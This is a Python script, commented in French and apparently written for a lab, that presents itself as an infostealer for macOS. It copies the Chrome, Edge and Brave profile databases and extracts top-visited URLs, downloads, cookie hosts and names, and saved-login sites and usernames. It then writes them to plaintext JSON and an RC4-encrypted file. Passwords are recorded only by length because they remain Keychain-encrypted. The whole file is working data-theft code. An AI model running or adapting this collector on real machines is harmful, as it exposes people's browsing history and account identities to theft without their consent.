#!/usr/bin/env python3
# language: Python 3, file: star_infostealer.py, target: macOS
# Infostealer Chromium : scans navigations, telechargements, structure des logins
# Export JSON chiffre RC4. Les mot de passe Chromium sont chiffres Keychain - structure only.
# Usage: python3 star_infostealer.py [clé_rc4]
import os, json, subprocess, sqlite3, tempfile, shutil

def rc4(data, key):
    S = list(range(256)); j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    i = j = 0; out = bytearray()
    for b in data:
        i = (i + 1) & 0xFF; j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        out.append(b ^ S[(S[i] + S[j]) & 0xFF])
    return bytes(out)

BROWSERS = {
    "Chrome": "~/Library/Application Support/Google/Chrome/Default",
    "Edge":   "~/Library/Application Support/Microsoft Edge/Default",
    "Brave":  "~/Library/Application Support/BraveSoftware/Brave-Browser/Default",
}

def probe(profile, name, report):
    for db, label in [("History", "urls"), ("History", "downloads"),
                      ("Cookies", "cookies"), ("Login Data", "logins")]:
        path = os.path.join(profile, db)
        if not os.path.exists(path): continue
        tmp = tempfile.mktemp(suffix=".db")
        shutil.copy(path, tmp)     # SQLite verrouille par le navigateur : copie d'abord
        try:
            con = sqlite3.connect(tmp)
            if label == "urls":
                rows = con.execute("select url, title, visit_count from urls order by visit_count desc limit 30").fetchall()
                report[name][label] = [{"url": u, "titre": t, "visites": c} for u, t, c in rows]
            elif label == "downloads":
                rows = con.execute("select target_path, tab_url from downloads limit 20").fetchall()
                report[name][label] = [{"fichier": a, "source": b} for a, b in rows]
            elif label == "cookies":
                rows = con.execute("select host_key, name, length(value)+length(encrypted_value) from cookies limit 50").fetchall()
                report[name][label] = [{"host": h, "nom": n, "taille": l} for h, n, l in rows]
            elif label == "logins":
                rows = con.execute("select origin_url, username_value, length(password_value) from logins limit 30").fetchall()
                report[name][label] = [{"site": u, "user": n, "pwd_chiffre": l} for u, n, l in rows]
            con.close()
        except Exception as e:
            report[name][label] = [{"erreur": str(e)}]
        os.unlink(tmp)

def main():
    import sys
    key = (sys.argv[1] if len(sys.argv) > 1 else "star-lab-key").encode()
    report = {n: {} for n in BROWSERS}
    for name, profile in BROWSERS.items():
        p = os.path.expanduser(profile)
        if os.path.isdir(p): probe(p, name, report)
    out = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sorties")
    os.makedirs(out, exist_ok=True)
    data = json.dumps(report, ensure_ascii=False, indent=1)
    open(os.path.join(out, "infostealer_clair.json"), "w").write(data)
    enc = rc4(data.encode(), key)
    open(os.path.join(out, "infostealer.bin"), "wb").write(enc)
    total = sum(len(v) for b in report.values() for v in b.values())
    print(f"[OK] {total} entrees collectees")
    print(f"     clair : sorties/infostealer_clair.json")
    print(f"     chiffre RC4 : sorties/infostealer.bin (cle: '{key.decode()}')")
    print(f"     note: les mots de passe Chromium restent chiffres Keychain (v10) -")
    print(f"           la table logins expose sites+users, les valeurs attendent un lab keychain")

if __name__ == "__main__":
    main()
